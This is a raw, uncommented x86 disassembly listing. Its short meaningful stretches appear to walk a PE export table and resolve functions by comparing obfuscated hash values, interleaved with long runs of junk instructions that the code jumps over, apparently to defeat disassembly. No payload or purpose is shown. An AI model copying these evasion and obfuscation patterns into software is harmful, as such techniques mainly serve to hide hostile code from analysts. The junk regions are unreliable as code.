  402080:	movzx  ecx,WORD PTR [ebp-0x4]
  402084:	jg     0x40226d
  40208a:	xor    eax,esi
  40208c:	sub    ecx,eax
  40208e:	sub    ecx,edi
  402090:	jmp    0x402264
  402095:	pop    es
  402096:	sbb    DWORD PTR [ecx+ebx*2],esi
  402099:	cmp    al,0x75
  40209b:	push   ebx
  40209c:	popa   
  40209d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40209e:	ins    DWORD PTR es:[edi],dx
  40209f:	std    
  4020a0:	and    DWORD PTR [edx+0x7f7bd9a9],ebp
  4020a6:	add    bh,BYTE PTR [esi+0x7e]
  4020a9:	mov    ch,0x7f
  4020ab:	jle    0x40212b
  4020ad:	xor    bl,BYTE PTR ds:0x5e682911
  4020b3:	sbb    edi,eax
  4020b5:	xor    BYTE PTR [edx+0xc],dl
  4020b8:	adc    ah,ch
  4020ba:	add    DWORD PTR [ecx],edi
  4020bc:	retf   
  4020bd:	or     BYTE PTR [eax-0x30872908],bh
  4020c3:	and    DWORD PTR [ecx-0x186af606],0xffffffc5
  4020ca:	pushf  
  4020cb:	js     0x4020b4
  4020cd:	push   eax
  4020ce:	sub    al,0x15
  4020d0:	push   es
  4020d1:	scas   eax,DWORD PTR es:[edi]
  4020d2:	sub    bl,BYTE PTR [ecx+0x66790eb0]
  4020d8:	mov    bh,al
  4020da:	std    
  4020db:	shl    DWORD PTR [edi-0x26],0x5e
  4020df:	mov    dh,0x12
  4020e1:	jne    0x402149
  4020e3:	sbb    edi,DWORD PTR [edx-0x114f224a]
  4020e9:	jmp    0x402127
  4020eb:	add    al,0x2e
  4020ed:	bound  eax,QWORD PTR [edx+0x1e74505d]
  4020f3:	push   ebp
  4020f4:	jae    0x4020d0
  4020f6:	sbb    eax,0xff8cb7ad
  4020fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020fc:	(bad)  
  4020fd:	out    dx,al
  4020fe:	(bad)  
  4020ff:	mov    DWORD PTR [edi-0x32],ecx
  402102:	pop    esi
  402103:	rcl    BYTE PTR [esp+eax*4],cl
  402106:	das    
  402107:	pop    ebx
  402108:	in     al,dx
  402109:	ins    BYTE PTR es:[edi],dx
  40210a:	push   0x24
  40210c:	jo     0x402112
  40210e:	aad    0x1f
  402110:	jge    0x4020aa
  402112:	adc    bl,bl
  402114:	push   eax
  402115:	xor    ch,BYTE PTR [ebp+0x3588da02]
  40211b:	rcl    BYTE PTR [ebx],cl
  40211d:	ret    0x85de
  402120:	leave  
  402121:	mov    ?,WORD PTR [edx-0x5b]
  402124:	retf   0x9c69
  402127:	mov    es,edi
  402129:	and    BYTE PTR [eax+0x6d805c0a],0x14
  402130:	(bad)  
  402131:	sub    ebp,ebx
  402133:	(bad)  
  402134:	cmp    al,0x38
  402136:	shr    BYTE PTR [ebp-0x7330c5c6],1
  40213c:	popa   
  40213d:	add    eax,0x94dec74b
  402142:	cmp    BYTE PTR [edi+eax*2],ah
  402145:	dec    eax
  402146:	mov    esi,0x77c6b9f4
  40214b:	(bad)  
  40214c:	fmul   DWORD PTR [ecx-0x6e72e53c]
  402152:	push   esp
  402153:	std    
  402154:	shl    BYTE PTR [ebp+0x14],cl
  402157:	cmp    edx,edx
  402159:	inc    ebx
  40215a:	mov    esp,0xe8603bb2
  40215f:	mov    ch,0x6a
  402161:	in     al,dx
  402162:	int3   
  402163:	imul   ebp,DWORD PTR [esi+0x5c65b623],0xb22e74c6
  40216d:	daa    
  40216e:	arpl   WORD PTR [edx-0x5e82d838],bp
  402174:	pop    es
  402175:	popa   
  402176:	sub    BYTE PTR [ecx+0x1a],ah
  402179:	loope  0x402128
  40217b:	(bad)  
  40217c:	psubsw mm5,QWORD PTR [esi-0x7f1777b7]
  402183:	xlat   BYTE PTR ds:[ebx]
  402184:	adc    dh,BYTE PTR [ecx]
  402186:	cmp    eax,0x952fbc30
  40218b:	test   DWORD PTR fs:[edx+edi*8+0x169d1c01],esi
  402193:	fistp  QWORD PTR [esi+0x16c7fe14]
  402199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40219a:	scas   eax,DWORD PTR es:[edi]
  40219b:	shl    DWORD PTR [eax+0x77a319bf],cl
  4021a1:	and    BYTE PTR [ebx-0x1851edbb],0x86
  4021a8:	daa    
  4021a9:	retf   0xc6e4
  4021ac:	shl    dh,1
  4021ae:	es sub ah,bl
  4021b1:	push   ebx
  4021b2:	xlat   BYTE PTR ds:[ebx]
  4021b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021b4:	into   
  4021b5:	retf   
  4021b6:	xor    eax,DWORD PTR ds:0x5cc03d23
  4021bc:	adc    BYTE PTR [ecx],ch
  4021be:	mov    al,BYTE PTR [edx-0x3ac772e8]
  4021c4:	shl    DWORD PTR ds:0xe84665f5,0x86
  4021cb:	xchg   DWORD PTR [eax+0x759ad6c5],esp
  4021d1:	and    edx,edx
  4021d3:	cmp    dh,BYTE PTR [esi-0x5e]
  4021d6:	sub    ch,ch
  4021d8:	push   ebp
  4021d9:	out    0xe3,al
  4021db:	fdiv   st(3),st
  4021dd:	cmp    eax,0xad51df57
  4021e2:	retf   0x7b0f
  4021e5:	mov    al,ds:0x20450660
  4021ea:	xor    BYTE PTR [ebp-0x41],al
  4021ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021ee:	sbb    esp,DWORD PTR [eax+0x4b]
  4021f1:	(bad)  
  4021f2:	gs sbb bl,al
  4021f5:	and    eax,0xb6041577
  4021fa:	test   BYTE PTR [edx-0x32d6ca36],al
  402200:	pop    ebp
  402201:	sbb    al,0x80
  402203:	jg     0x402241
  402205:	outs   dx,BYTE PTR ds:[esi]
  402206:	mov    BYTE PTR [edi],al
  402208:	pop    es
  402209:	cli    
  40220a:	neg    BYTE PTR [esi-0x474a06d9]
  402210:	retf   
  402211:	xor    al,0x54
  402213:	ds daa 
  402215:	sahf   
  402216:	push   edi
  402217:	loope  0x4021b8
  402219:	jp     0x4021b3
  40221b:	cmp    ch,ch
  40221d:	mov    BYTE PTR [edi],ah
  40221f:	shr    BYTE PTR [ecx],0xbb
  402222:	mov    ebp,0xc39c8cb3
  402227:	dec    ebx
  402228:	inc    ebx
  402229:	sahf   
  40222a:	add    ebp,DWORD PTR [edi]
  40222c:	sub    bh,BYTE PTR [eax-0x54775ec4]
  402232:	cmp    al,0x81
  402234:	imul   edi,DWORD PTR [esi-0x5376a71a],0xfd2a78c5
  40223e:	xlat   BYTE PTR ds:[ebx]
  40223f:	xor    al,0xa5
  402241:	rcr    BYTE PTR [ecx],cl
  402243:	and    bh,BYTE PTR [ebp+0x2e]
  402246:	push   eax
  402247:	rcl    bh,cl
  402249:	nop
  40224a:	add    DWORD PTR [eax-0x10],esi
  40224d:	out    0xc8,eax
  40224f:	adc    al,BYTE PTR [esi+eax*4-0x54c22321]
  402256:	fnstcw WORD PTR [eax+0xe]
  402259:	inc    esp
  40225a:	int3   
  40225b:	inc    BYTE PTR [ebx]
  40225d:	pop    ecx
  40225e:	aaa    
  40225f:	mov    esp,0xc86b6aa1
  402264:	mov    WORD PTR [ebp-0x4],cx
  402268:	jmp    0x40227a
  40226d:	xor    eax,esi
  40226f:	lea    eax,[eax+ecx*1+0x327299]
  402276:	mov    WORD PTR [ebp-0x4],ax
  40227a:	mov    eax,DWORD PTR [ebp-0xc]
  40227d:	cmp    eax,ebx
  40227f:	je     0x402293
  402285:	mov    eax,DWORD PTR [ebp-0x8]
  402288:	mov    DWORD PTR [eax],0x60341e8e
  40228e:	jmp    0x4028b6
  402293:	mov    eax,DWORD PTR [ebp+0x8]
  402296:	mov    ecx,DWORD PTR [ebp-0x8]
  402299:	xor    eax,esi
  40229b:	add    eax,edi
  40229d:	cmp    DWORD PTR [ecx],eax
  40229f:	je     0x40289e
  4022a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4022a8:	mov    eax,DWORD PTR [ebp-0x8]
  4022ab:	mov    eax,DWORD PTR [eax]
  4022ad:	mov    eax,DWORD PTR [eax+0x3c]
  4022b0:	lea    ecx,[ecx*8+0x78]
  4022b7:	add    eax,ecx
  4022b9:	jmp    0x40248d
  4022be:	je     0x402337
  4022c0:	int3   
  4022c1:	xchg   ecx,eax
  4022c2:	int    0xbd
  4022c4:	jne    0x402339
  4022c6:	jae    0x4022b2
  4022c8:	(bad)  
  4022c9:	pavgb  mm2,mm4
  4022cc:	mov    dh,0xb8
  4022ce:	mov    dh,0x3
  4022d0:	jle    0x402350
  4022d2:	mov    ch,0x7f
  4022d4:	jle    0x402354
  4022d6:	cmc    
  4022d7:	ins    BYTE PTR es:[edi],dx
  4022d8:	sbb    ecx,DWORD PTR [eax+0x35]
  4022db:	aas    
  4022dc:	popa   
  4022dd:	(bad)  
  4022de:	jl     0x4022ee
  4022e0:	rcr    DWORD PTR [eax+0x62],0x10
  4022e4:	xor    DWORD PTR [ebp-0x6e],esp
  4022e7:	bound  ecx,QWORD PTR [ecx+ebx*1]
  4022ea:	mov    al,BYTE PTR [ebx-0x48]
  4022ed:	nop
  4022ee:	out    0x47,al
  4022f0:	inc    esp
  4022f1:	fisub  DWORD PTR [edx+0x4cae2b76]
  4022f7:	arpl   WORD PTR [edx],ax
  4022f9:	and    al,0xc4
  4022fb:	mov    al,dl
  4022fd:	das    
  4022fe:	jmp    0x4022b2
  402300:	xor    eax,0xd13231f9
  402305:	in     al,0xd8
  402307:	and    al,0x51
  402309:	fld    DWORD PTR [esi-0x71227baa]
  40230f:	jmp    0x44ad6952
  402314:	ds jmp 0xb80c:0x31d19421
  40231c:	mov    esp,0x1402efb1
  402321:	fdiv   DWORD PTR [esi]
  402323:	and    eax,0x54f71dd0
  402328:	and    BYTE PTR [edi-0x43],0xa1
  40232c:	pop    ecx
  40232d:	and    eax,0xd0007b9a
  402332:	xlat   BYTE PTR ds:[ebx]
  402333:	mov    esp,0x8a24ca50
  402338:	xchg   edx,eax
  402339:	and    DWORD PTR [edx],esi
  40233b:	sar    ah,0x47
  40233e:	pop    eax
  40233f:	and    BYTE PTR [eax],bh
  402341:	xchg   ebp,eax
  402342:	mov    cl,0xd3
  402344:	ds xchg ebp,edi
  402347:	cmp    ecx,DWORD PTR [ebp-0x91554cd]
  40234d:	clc    
  40234e:	(bad)  
  402350:	add    ebp,eax
  402352:	adc    ch,BYTE PTR [ecx-0x61ecf05f]
  402358:	popa   
  402359:	add    al,BYTE PTR ds:0x6ede164d
  40235f:	push   ecx
  402360:	sub    dl,ah
  402362:	sub    esi,DWORD PTR [edi-0x36]
  402365:	fisubr DWORD PTR [edi]
  402367:	add    BYTE PTR [ebx],cl
  402369:	imul   esi,DWORD PTR [eax+edi*1],0xffffffe8
  40236d:	lock je 0x402385
  402370:	inc    esp
  402371:	push   cs
  402372:	leave  
  402373:	sbb    al,0x79
  402375:	clc    
  402376:	dec    ecx
  402377:	hlt    
  402378:	pop    esi
  402379:	mov    bh,0x51
  40237b:	add    DWORD PTR [esi+0x44],ebx
  40237e:	mov    eax,0x12cd6b31
  402383:	mov    ds:0xc1c11546,al
  402388:	loopne 0x40234c
  40238a:	jns    0x40235e
  40238c:	test   eax,0x9b4ef5d0
  402391:	lahf   
  402392:	fistp  DWORD PTR [ebx+0x7c]
  402395:	mov    esi,0x5c56a1d7
  40239a:	daa    
  40239b:	push   ebx
  40239c:	dec    ecx
  40239d:	pop    ebp
  40239e:	sub    BYTE PTR ds:0x5607155c,dl
  4023a4:	inc    bp
  4023a6:	loopne 0x40238c
  4023a8:	out    0x68,al
  4023aa:	dec    edx
  4023ab:	leave  
  4023ac:	loope  0x4023e2
  4023ae:	jp     0x4023c3
  4023b0:	jb     0x40233f
  4023b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023b3:	cs xchg esp,eax
  4023b5:	pusha  
  4023b6:	push   ebp
  4023b7:	push   edx
  4023b8:	push   edx
  4023b9:	retf   
  4023ba:	or     al,0x82
  4023bc:	xchg   edx,eax
  4023bd:	neg    eax
  4023bf:	xchg   ecx,eax
  4023c0:	scas   eax,DWORD PTR es:[edi]
  4023c1:	call   0xd5ff0c2c
  4023c6:	je     0x40243b
  4023c8:	in     al,0x19
  4023ca:	mov    edx,0xb45996e1
  4023cf:	in     al,0xc3
  4023d1:	or     al,0x1e
  4023d3:	jmp    0xfe68:0xfae56be5
  4023da:	push   0x76
  4023dc:	push   cs
  4023dd:	or     eax,0x94a4b838
  4023e2:	adc    ebp,DWORD PTR [ebx-0x41]
  4023e5:	inc    ecx
  4023e6:	jb     0x4023cf
  4023e8:	cmp    bh,BYTE PTR [edx]
  4023ea:	inc    edx
  4023eb:	int3   
  4023ec:	mov    esp,0x9feb3209
  4023f1:	push   esp
  4023f2:	(bad)  
  4023f3:	sbb    eax,0xd1e12989
  4023f8:	xrelease mov BYTE PTR [edi-0x74],cl
  4023fc:	push   ecx
  4023fd:	ret    
  4023fe:	pushf  
  4023ff:	jbe    0x402476
  402401:	cmp    edx,DWORD PTR [edx+0x3a58bc4]
  402407:	jb     0x402460
  402409:	jb     0x4023b9
  40240b:	cmp    edx,ebp
  40240d:	daa    
  40240e:	and    dl,BYTE PTR [eax+0x1d]
  402411:	mov    bh,0x41
  402413:	sbb    DWORD PTR [edx],esp
  402415:	pusha  
  402416:	jp     0x4023f3
  402418:	leave  
  402419:	leave  
  40241a:	mov    BYTE PTR [ecx-0x4cca96f7],ch
  402420:	mov    dl,0x53
  402422:	or     eax,0xfdc8a3cb
  402427:	pop    ds
  402428:	inc    esi
  402429:	push   cs
  40242a:	gs or  edx,ecx
  40242d:	push   edx
  40242e:	fsubr  DWORD PTR ds:0xb620092a
  402434:	mov    esp,0xb1dd3354
  402439:	xchg   ebp,eax
  40243a:	jecxz  0x4023c5
  40243c:	inc    edx
  40243d:	jmp    0x1c31:0x58c6e1f
  402444:	xlat   BYTE PTR ds:[ebx]
  402445:	xchg   esp,eax
  402446:	or     eax,0xe2716bf7
  40244b:	jb     0x4024c1
  40244d:	cs dec edi
  40244f:	inc    eax
  402450:	inc    ecx
  402451:	adc    eax,0xb632f0c1
  402456:	pusha  
  402457:	adc    al,0x8f
  402459:	jge    0x40244d
  40245b:	cmp    al,0x88
  40245d:	ret    0xbcd4
  402460:	adc    DWORD PTR [esi+0x33],0x47a0cd47
  402467:	cdq    
  402468:	jne    0x402454
  40246a:	dec    edi
  40246b:	enterw 0xdee4,0x56
  402470:	mov    eax,0x3c407d1a
  402475:	xor    DWORD PTR [esp+edx*1-0x25],edx
  402479:	xchg   edx,eax
  40247a:	aad    0x49
  40247c:	out    0x81,al
  40247e:	clc    
  40247f:	test   DWORD PTR [edx],esi
  402481:	(bad)  
  402482:	push   edx
  402483:	xor    eax,0x6f8fb3d0
  402488:	popa   
  402489:	nop
  40248a:	lahf   
  40248b:	ins    DWORD PTR es:[edi],dx
  40248c:	or     eax,0x8bf84d8b
  402491:	or     DWORD PTR [ebx+0x45890804],ecx
  402497:	in     al,0x8b
  402499:	inc    ebp
  40249a:	or     BYTE PTR [ebx],dh
  40249c:	mov    BYTE PTR [ebx],0xc7
  40249f:	mov    DWORD PTR [ebp-0x20],eax
  4024a2:	mov    eax,DWORD PTR [ebp+0x8]
  4024a5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024a8:	xor    eax,esi
  4024aa:	add    eax,edi
  4024ac:	cmp    ecx,eax
  4024ae:	je     0x4028b6
  4024b4:	mov    eax,DWORD PTR [ebp-0x8]
  4024b7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024ba:	add    ecx,DWORD PTR [eax]
  4024bc:	jmp    0x402690
  4024c1:	xor    al,0x5a
  4024c3:	inc    edx
  4024c4:	pop    ebp
  4024c5:	pop    esp
  4024c6:	jge    0x4024fd
  4024c8:	arpl   WORD PTR [edx],ax
  4024ca:	outs   dx,BYTE PTR ds:[esi]
  4024cb:	dec    esi
  4024cc:	or     eax,0xb79e0d54
  4024d1:	in     eax,dx
  4024d2:	or     eax,0x7fb57e7e
  4024d7:	jle    0x402557
  4024d9:	and    eax,0x62ab18a0
  4024de:	enter  0x30f3,0x82
  4024e2:	xchg   ebx,esi
  4024e4:	stc    
  4024e5:	out    dx,al
  4024e6:	lahf   
  4024e7:	xor    eax,0xf40cb43b
  4024ec:	retf   
  4024ed:	popa   
  4024ee:	mov    bl,0x1a
  4024f0:	out    0x6a,eax
  4024f2:	mov    edx,0x1b70b9e1
  4024f7:	ficomp WORD PTR [ebx+0x24]
  4024fa:	mov    ecx,DWORD PTR [edi+0x61]
  4024fd:	sbb    eax,0x3c83105e
  402502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402503:	and    edi,edx
  402505:	mov    dh,0x73
  402507:	jbe    0x40255a
  402509:	sbb    DWORD PTR [ebx+0x323102b1],edi
  40250f:	and    eax,0x93408639
  402514:	adc    edi,DWORD PTR [edx+0x7]
  402517:	ret    
  402518:	jbe    0x4024ff
  40251a:	mov    dl,0x74
  40251c:	pop    es
  40251d:	jge    0x4024a4
  40251f:	rcr    BYTE PTR [edi+0x5a],0x79
  402523:	dec    edx
  402524:	rol    edx,0xfd
  402527:	(bad)  
  402528:	and    ebp,DWORD PTR [eax-0x544f8b31]
  40252e:	inc    edx
  40252f:	push   ebp
  402530:	mov    dl,al
  402532:	cmp    eax,0x6d33fcd6
  402537:	clc    
  402538:	ins    BYTE PTR es:[edi],dx
  402539:	xchg   ebp,eax
  40253a:	add    edx,DWORD PTR [ecx+edi*8+0x60740aff]
  402541:	sub    DWORD PTR [esi-0x6d2fa113],ebx
  402547:	iret   
  402548:	push   esp
  402549:	adc    eax,0x8f22a0ec
  40254e:	inc    ebx
  40254f:	scas   eax,DWORD PTR es:[edi]
  402550:	fs (bad) 
  402553:	or     BYTE PTR [edx],dl
  402555:	leave  
  402556:	mov    edx,0x2cd97b1
  40255b:	inc    ebx
  40255c:	inc    edx
  40255d:	and    BYTE PTR [edi+0x6bea31a5],cl
  402563:	mov    BYTE PTR [edx+eax*4-0x134ef9ab],ch
  40256a:	and    BYTE PTR [ecx+eax*4-0x1400b7db],dl
  402571:	add    al,BYTE PTR [ebx+ebp*4+0x7a]
  402575:	(bad)  
  402576:	jmp    0x17cd:0x395aeee0
  40257d:	inc    eax
  40257e:	push   edi
  40257f:	sub    al,0x46
  402581:	push   ebp
  402582:	outs   dx,BYTE PTR ds:[esi]
  402583:	ins    BYTE PTR es:[edi],dx
  402584:	mov    ecx,0x451d533a
  402589:	jno    0x40255c
  40258b:	add    al,0x35
  40258d:	in     al,0x25
  40258f:	lahf   
  402590:	push   cs
  402591:	je     0x4025ad
  402593:	jge    0x4025b9
  402595:	push   ss
  402596:	jb     0x402556
  402598:	cdq    
  402599:	jne    0x4025cc
  40259b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40259c:	push   esp
  40259d:	fmul   st,st(4)
  40259f:	push   ebx
  4025a0:	jmp    0xe9e2:0x22791001
  4025a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025a8:	retf   0x8b4d
  4025ab:	test   al,0xf5
  4025ad:	das    
  4025ae:	fist   DWORD PTR [ebx+0x222607b6]
  4025b4:	jns    0x402616
  4025b6:	and    DWORD PTR [ecx],edx
  4025b8:	cmp    eax,0xe436fd75
  4025bd:	retf   
  4025be:	fwait
  4025bf:	into   
  4025c0:	adc    al,0x3
  4025c2:	jae    0x4025fd
  4025c4:	das    
  4025c5:	jno    0x40259d
  4025c7:	les    esi,FWORD PTR [edi]
  4025c9:	popa   
  4025ca:	add    DWORD PTR [edi+0x7129b485],edx
  4025d0:	dec    eax
  4025d1:	hlt    
  4025d2:	rcl    ebp,1
  4025d4:	inc    esp
  4025d5:	imul   ebp,DWORD PTR [edx],0xe3bab443
  4025db:	push   esp
  4025dc:	hlt    
  4025dd:	repz add eax,0x89591062
  4025e3:	dec    edx
  4025e4:	aam    0x6b
  4025e6:	xchg   ebp,eax
  4025e7:	adc    DWORD PTR ds:0x2765912e,ebp
  4025ed:	stos   BYTE PTR es:[edi],al
  4025ee:	adc    BYTE PTR [esi+0x6ee9bb11],cl
  4025f4:	mov    dl,BYTE PTR [ebx+0x44]
  4025f7:	imul   ch
  4025f9:	popf   
  4025fa:	aaa    
  4025fb:	enter  0x4620,0x9a
  4025ff:	mov    esi,0xb5cd5a9b
  402604:	sub    al,0xe7
  402606:	cmp    edi,DWORD PTR [ebx]
  402608:	dec    esp
  402609:	imul   esp,esp,0xf7a20082
  40260f:	mov    al,0xb9
  402611:	jb     0x4025ea
  402613:	test   BYTE PTR [ebx-0x15],ch
  402616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402617:	hlt    
  402618:	inc    edx
  402619:	jno    0x402672
  40261b:	or     eax,0x41dace48
  402620:	int3   
  402621:	fcom   DWORD PTR [eax]
  402623:	xchg   esp,eax
  402624:	test   DWORD PTR [ecx+edi*4+0x20],ebx
  402628:	call   0xec9d74a1
  40262d:	or     DWORD PTR ds:0xf9016999,edi
  402633:	mov    edx,0xfc8aa94d
  402638:	jmp    0x4026b5
  40263a:	lahf   
  40263b:	mov    dl,0xdf
  40263d:	mov    WORD PTR [edi],es
  40263f:	inc    esp
  402640:	jl     0x4026aa
  402642:	push   es
  402643:	mov    bl,0xa0
  402645:	jmp    0xcdec7564
  40264a:	dec    ecx
  40264b:	retf   0x5a1b
  40264e:	xchg   esi,eax
  40264f:	sbb    bl,BYTE PTR [edi]
  402651:	in     eax,0x47
  402653:	sub    DWORD PTR [edi-0x36aae5fb],0xf098a1b2
  40265d:	cdq    
  40265e:	out    0x89,al
  402660:	and    eax,0xce54af1d
  402665:	lods   eax,DWORD PTR ds:[esi]
  402666:	mov    esp,0x1a3c5fcf
  40266b:	into   
  40266c:	fwait
  40266d:	xchg   ecx,eax
  40266e:	sbb    ebx,DWORD PTR [esi-0x612eb2f]
  402674:	cmp    al,0xdd
  402676:	pop    ebp
  402677:	jnp    0x4026d3
  402679:	stos   DWORD PTR es:[edi],eax
  40267a:	mov    ah,0xa3
  40267c:	in     eax,0x65
  40267e:	ror    BYTE PTR [edx+0x35ca5915],cl
  402684:	lea    edx,[ebp+0x446d3c9a]
  40268a:	bound  ecx,QWORD PTR [ecx-0x2fc117be]
  402690:	mov    DWORD PTR [ebp-0x20],ecx
  402693:	mov    eax,DWORD PTR [ebp-0x20]
  402696:	mov    ecx,DWORD PTR [ebp-0x8]
  402699:	mov    eax,DWORD PTR [eax+0xc]
  40269c:	mov    ecx,DWORD PTR [ecx]
  40269e:	mov    al,BYTE PTR [eax+ecx*1]
  4026a1:	add    al,0x3a
  4026a3:	xor    al,0x44
  4026a5:	cmp    al,0xc1
  4026a7:	je     0x402892
  4026ad:	mov    eax,DWORD PTR [ebp+0x8]
  4026b0:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b3:	xor    eax,esi
  4026b5:	add    eax,edi
  4026b7:	jmp    0x40288b
  4026bc:	ins    BYTE PTR es:[edi],dx
  4026bd:	jo     0x4026e5
  4026bf:	arpl   WORD PTR [edx],si
  4026c1:	jge    0x402730
  4026c3:	jno    0x402694
  4026c5:	adc    al,0x86
  4026c7:	mov    dl,0x16
  4026c9:	xchg   ecx,eax
  4026ca:	xchg   BYTE PTR [edi+0x7e7e0f24],al
  4026d0:	mov    ch,0x7f
  4026d2:	jle    0x402752
  4026d4:	sahf   
  4026d5:	call   0x5fb7c4f6
  4026da:	shr    BYTE PTR [esi-0x2e],cl
  4026dd:	js     0x40274f
  4026df:	lds    edi,FWORD PTR [edi-0x4a1d139a]
  4026e5:	dec    eax
  4026e6:	xchg   BYTE PTR [esi+0x1e],ah
  4026e9:	push   ecx
  4026ea:	iret   
  4026eb:	sub    eax,0xb2340a62
  4026f0:	fwait
  4026f1:	inc    ebx
  4026f2:	push   0xe4f3ba32
  4026f7:	or     eax,0xc045c1ab
  4026fc:	mov    cs,WORD PTR [ebx]
  4026fe:	mov    eax,0xcc66aa81
  402703:	rcr    DWORD PTR [ebp+0x45f93a28],1
  402709:	int3   
  40270a:	data16 cs mov dl,0xec
  40270e:	sub    cl,BYTE PTR [edi+0x0]
  402711:	pop    ebx
  402712:	push   0xc81ce918
  402717:	sbb    ecx,esp
  402719:	es scas al,BYTE PTR es:[edi]
  40271b:	icebp  
  40271c:	or     ah,ch
  40271e:	and    al,0x6f
  402720:	jp     0x40278a
  402722:	daa    
  402723:	push   ebp
  402724:	retf   0x863e
  402727:	add    eax,0x538741a7
  40272c:	fwait
  40272d:	push   esp
  40272e:	xchg   esp,eax
  40272f:	mov    edi,0xcad9ee6e
  402734:	inc    edx
  402735:	cmp    al,0x7
  402737:	scas   eax,DWORD PTR es:[edi]
  402738:	arpl   WORD PTR [edi-0x4e],bp
  40273b:	xchg   DWORD PTR [edx-0x78],eax
  40273e:	push   cs
  40273f:	xchg   ecx,eax
  402740:	add    BYTE PTR [edx-0x28],bh
  402743:	in     al,0x41
  402745:	and    al,0x8a
  402747:	and    edx,DWORD PTR [edi+0x436c518f]
  40274d:	loopne 0x402723
  40274f:	enter  0x1e4d,0x46
  402753:	mov    DWORD PTR [ebp-0x2b],ecx
  402756:	or     ebp,DWORD PTR [esi]
  402758:	jb     0x402724
  40275a:	adc    al,0x1a
  40275c:	sbb    dh,BYTE PTR [eax+eiz*4+0x7d]
  402760:	or     al,0x53
  402762:	sbb    DWORD PTR [ebp-0x37],esp
  402765:	sub    al,0x5c
  402767:	in     eax,dx
  402768:	push   edx
  402769:	and    eax,DWORD PTR [esp+ebx*1-0x24]
  40276d:	adc    eax,0xb6a8beab
  402772:	pop    edx
  402773:	add    BYTE PTR [eax+0x37],cl
  402776:	scas   eax,DWORD PTR es:[edi]
  402777:	fstp   QWORD PTR [edi-0x383d067d]
  40277d:	sub    eax,0x56c1c464
  402782:	pop    esp
  402783:	ins    BYTE PTR es:[edi],dx
  402784:	inc    ecx
  402785:	mov    cl,0x4c
  402787:	ret    
  402788:	repnz daa 
  40278a:	push   ecx
  40278b:	mov    edi,0xedca2010
  402790:	(bad)  
  402792:	pop    DWORD PTR [ecx+0x16]
  402795:	push   0xf3f7d881
  40279a:	pop    ds
  40279b:	and    dl,ah
  40279d:	sub    BYTE PTR [ebp-0x22],0xe2
  4027a1:	add    al,0xc4
  4027a3:	ror    edi,0x1d
  4027a6:	and    ecx,DWORD PTR [ecx+0x15c834ee]
  4027ac:	mov    esi,0xa6125e9b
  4027b1:	xchg   esp,eax
  4027b2:	aam    0x5d
  4027b4:	xor    dl,BYTE PTR [edi]
  4027b6:	xchg   ebx,edi
  4027b8:	ds xchg ecx,eax
  4027ba:	fdiv   DWORD PTR es:[esi-0x76bfd07b]
  4027c1:	fld    st(0)
  4027c3:	jmp    0x1314bc4b
  4027c8:	int    0xe9
  4027ca:	inc    esp
  4027cb:	icebp  
  4027cc:	pop    ecx
  4027cd:	sahf   
  4027ce:	mov    bl,ch
  4027d0:	add    edi,ebp
  4027d2:	ss inc ebp
  4027d4:	add    BYTE PTR [edx+edx*2],ah
  4027d7:	(bad)  
  4027d8:	cld    
  4027d9:	test   eax,0x582366b9
  4027de:	outs   dx,BYTE PTR ds:[esi]
  4027df:	jo     0x402816
  4027e1:	ficomp DWORD PTR [esi+0x66]
  4027e4:	daa    
  4027e5:	push   eax
  4027e6:	mov    esp,0xd754b977
  4027eb:	cmp    dl,0x1b
  4027ee:	jns    0x40282e
  4027f0:	repnz fstp TBYTE PTR [edx]
  4027f3:	jns    0x4027f4
  4027f5:	inc    esp
  4027f6:	inc    esi
  4027f7:	cs cld 
  4027f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027fa:	push   eax
  4027fb:	aaa    
  4027fc:	mov    BYTE PTR [ebp+0x2c1417d],cl
  402802:	lock jmp 0xff6c53fa
  402808:	adc    esp,DWORD PTR [ecx+0x689b91b1]
  40280e:	push   ebp
  40280f:	jo     0x40281e
  402811:	(bad)  
  402812:	cmp    al,0xf5
  402814:	add    edi,esi
  402816:	adc    DWORD PTR [esi-0x2b5ea19b],edx
  40281c:	pushf  
  40281d:	add    BYTE PTR [ecx-0x9],al
  402820:	jns    0x4027c2
  402822:	test   eax,0xb52b9adb
  402827:	std    
  402828:	cdq    
  402829:	adc    eax,edx
  40282b:	inc    ebx
  40282c:	add    eax,DWORD PTR [esi+0x3772180d]
  402832:	mov    edi,edi
  402834:	dec    edx
  402835:	fstp   QWORD PTR [ebp-0x59964dd2]
  40283b:	push   ecx
  40283c:	push   es
  40283d:	in     al,dx
  40283e:	aad    0x0
  402840:	(bad)  
  402841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402842:	out    0xa8,eax
  402844:	push   cs
  402845:	mov    ah,0xb4
  402847:	cmp    al,0x9c
  402849:	sahf   
  40284a:	mov    ecx,0x605baed4
  40284f:	add    eax,0x248a0826
  402854:	xchg   BYTE PTR [ebx+0x3c],ch
  402857:	pushw  0xfff1
  40285a:	xchg   edi,eax
  40285b:	jb     0x402807
  40285d:	fcmove st,st(2)
  40285f:	cdq    
  402860:	in     eax,0xe9
  402862:	cwde   
  402863:	popa   
  402864:	ret    0x25a7
  402867:	pop    edx
  402868:	jmp    0x4027ea
  40286a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40286b:	ins    DWORD PTR es:[edi],dx
  40286c:	pop    ebx
  40286d:	cld    
  40286e:	ror    BYTE PTR [edi],1
  402870:	sub    al,0xa
  402872:	add    DWORD PTR [ecx-0x2f],0xaf00d45c
  402879:	sahf   
  40287a:	dec    esi
  40287b:	daa    
  40287c:	les    ebp,FWORD PTR [esi-0x672928bb]
  402882:	sbb    al,0x8a
  402884:	mov    ebp,0xcbcad561
